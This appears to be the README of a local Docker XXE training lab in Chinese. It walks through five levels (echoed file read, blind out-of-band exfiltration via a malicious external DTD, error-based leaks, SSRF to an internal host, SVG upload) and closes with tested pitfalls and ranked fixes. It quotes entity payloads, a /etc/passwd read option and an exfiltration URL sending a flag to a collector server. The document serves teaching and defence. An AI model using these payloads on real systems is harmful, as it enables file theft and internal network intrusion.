# XXE 靶场

XML 外部实体注入的本地练习环境，PHP 8.1 + Apache + libxml 2.9.14，全部跑在 Docker 里。
五关是递进的：**会回显 → 不回显 → 不出网 → 打内网 → 传文件**。

## 端口

| 端口 | 容器 | 说明 |
|------|------|------|
| 8895 | xxe-web | L1~L5 + 修复对照页 |
| — | xxe-internal | **不映射端口**，只在容器网络里可达，L4 的目标 |

## 启停

```bash
./setup.sh                       # 建 uploads、给权限、构建并启动
docker compose down              # 停止
docker compose logs -f web       # 看 Apache 日志
```

`setup.sh` 里 `chmod 777 src/uploads` 不能省 —— L5 要让容器里的 `www-data` 往这个目录写文件。

如果 build 时报 `buildx/activity ... operation not permitted`，改用经典构建器：

```bash
DOCKER_BUILDKIT=0 docker compose up -d --build
```

## 关卡

| 关卡 | 场景 | 关键点 | 目标文件 |
|------|------|--------|----------|
| L1 | 商品导入，结果回显 | 最经典的 `<!ENTITY xxe SYSTEM "file:///flag">` | `/flag` |
| L2 | 日志上报，无回显 | 外部 DTD + 参数实体，把数据从 URL 带出去 | `/flag_blind` |
| L3 | 无回显 + 不许出网 | 本地 DTD，靠 parser 报错把内容打出来 | `/flag` |
| L4 | 数据源导入（拉远程 XML） | 协议白名单挡不住 XML 里的实体 → SSRF | 内网 `/flag` |
| L5 | 头像上传（允许 svg） | 图片本身是 XML，上传点就是 XXE 入口 | `/flag` |
| safe | 修复对照 | 同一段 payload 喂给安全写法，看它失效 | — |

flag 有三份：`flags/web.flag` → `/flag`，`flags/blind.flag` → `/flag_blind`，`flags/internal.flag` → 内网容器的 `/flag`。

## 练习入口

- 浏览器打开 <http://127.0.0.1:8895/> —— 有导航页和各关提示
- L2 盲打要先起接收服务器：`python3 poc/oob_server.py`（监听 0.0.0.0:9999）
  - `/evil.dtd` 恶意外部 DTD（默认读 `/flag_blind`，`?f=file:///etc/passwd` 可换）
  - `/feed.xml` L4 用的远程数据源
  - `/collect?d=xxx` 接收外带数据
- L4 的内网服务在宿主机上 `curl http://internal/admin.php` 会直接 DNS 失败 —— 这就是隔离
- L3 的本地 DTD 在容器里：`/usr/share/xml/xxe-lab.dtd`

## 一键验证（答案，先自己做再看）

```bash
python3 poc/xxe_exp.py           # 五关全打
python3 poc/xxe_exp.py 3 5       # 只打指定关卡
```

纯标准库，不依赖 requests。L2 用的临时接收服务器是脚本自己起的（随机端口），不用另开窗口。

实测输出：

```
L1 基础（有回显）      OK   FLAG{xxe_file_read_3f7a}
L2 盲打（OOB 外带）    OK   FLAG_xxe_blind_oob_5b2e
L3 报错型              OK   FLAG{xxe_file_read_3f7a}
L4 XXE → SSRF          OK   FLAG{xxe_ssrf_internal_9c1d}
L5 上传 SVG            OK   FLAG{xxe_file_read_3f7a}
```

## 目录

```
xxe/
├── compose.yml            # web（对外）+ internal（内网，不映射端口）
├── Dockerfile             # php:8.1-apache，开 display_errors、放本地 DTD
├── setup.sh               # 一键起靶场
├── src/
│   ├── index.php          # 导航
│   ├── l1.php … l5.php    # 五关
│   └── safe.php           # 修复对照
├── internal/admin.php     # 内网接口：只信任内网来源 IP
├── dtd/xxe-lab.dtd        # L3 用的「本地 DTD」（模拟系统自带 DTD）
├── flags/                 # 三份 flag
└── poc/
    ├── oob_server.py      # 外带接收端 + 恶意 DTD + 远程 feed
    └── xxe_exp.py         # 一键通关
```

## 实测结论（这些是踩出来的，不是抄的）

环境：`php:8.1-apache`，libxml **2.9.14**。

**1. PHP 8.1 上 XXE 照样能用。**
网上「PHP 8 之后外部实体默认关闭」的说法有歧义：默认关闭指的是不传 `LIBXML_NOENT` 的情况。
代码里一旦写了 `loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD)`，`file://` 照读、`http://` 照请求 —— 五关全通就是证据。
反过来，`safe.php` 里只传 `LIBXML_NONET` 不传 `NOENT`，同一个 payload 文本直接为空，实体没被展开。

**2. 报错型 payload 不能写在内部子集里。**
这条不是玄学，是 XML 规范：内部子集的实体声明值里不允许出现参数实体引用。libxml 直接报

```
PEReferences forbidden in internal subset in Entity
```

所以 L3 一开始打算「内部子集里拼 `%file;`」的思路完全走不通，必须把 DTD 放到外部
（`file://` 本地 DTD，或 `http://` 远程 DTD）。

**3. 盲打外带会被 URI 校验拦下来。**
`evil.dtd` 里把文件内容拼进 URL 后，libxml 会校验这个 URI：

```
Invalid URI: http://host:9999/collect?d=FLAG{xxe_file_read_3f7a}
```

- `{` `}` 是非法 URI 字符 → 请求根本发不出去
- 文件末尾的换行同理，URL 里混进裸 `\n` 也是非法

所以 L2 的目标文件 `/flag_blind` 特意做成**不带花括号、不带换行**的一串 token。
真实环境里盲打配置文件时也是这个坑，处理办法是挑内容干净的文件，或者改用 L3 那种报错外带。

**4. 接收端不能随便回包。**
libxml 会把外带请求的响应体当成实体内容继续解析。回 `ok` 会报

```
internal error: xmlParseInternalSubset: error detected in Markup declaration
```

整个 `loadXML` 返回 `false`（数据已经出去了，但解析失败）。回空体（`Content-Length: 0`）就正常。
L2 本来就是盲的，解析失败不影响战果 —— 但这个细节会让人误以为 payload 写错了。

**5. `(string)$simplexml` 只取根节点的直属文本。**
`<order><item>flag</item></order>` 强转字符串拿到的是空串，不是 `flag`。
L1 里必须遍历子节点。顺带一提：这也解释了很多站点「明明是 XXE 却不回显」。

**6. `host.docker.internal` 在 macOS 上映射到 192.168.65.254。**
容器侧访问宿主机的**任意**监听端口都通（不限于常用端口，随机高位端口实测可以）。
容器必须绑 `0.0.0.0`，绑 `127.0.0.1` 容器进不来。

**7. 内网隔离靠的是「没映射端口」，不是代码里的 IP 检查。**
`internal/admin.php` 里的来源 IP 白名单形同虚设 —— XXE 让 web 容器去请求它，
来源天然是内网地址，检查直接通过。真实内网服务也是这个逻辑。

## 修法（按强度）

1. **解析前拒绝 DOCTYPE**：`stripos($xml, '<!DOCTYPE') !== false` 就直接打回。业务不需要 DTD 时最省事，`safe.php` 里可勾选验证
2. **不传 `LIBXML_NOENT` / `LIBXML_DTDLOAD`**：实体不展开，页面只会看到 `&xxe;` 字面量
3. **加 `LIBXML_NONET`**：只挡网络请求（外带、SSRF），`file://` 照样能读，单独用不够
4. 更彻底的是换解析方式和收窄输入：只收 JSON、限制 XML 的 schema、用不支持 DTD 的解析器

第 1 条和第 2 条叠加基本够用；只做第 3 条是自我安慰。
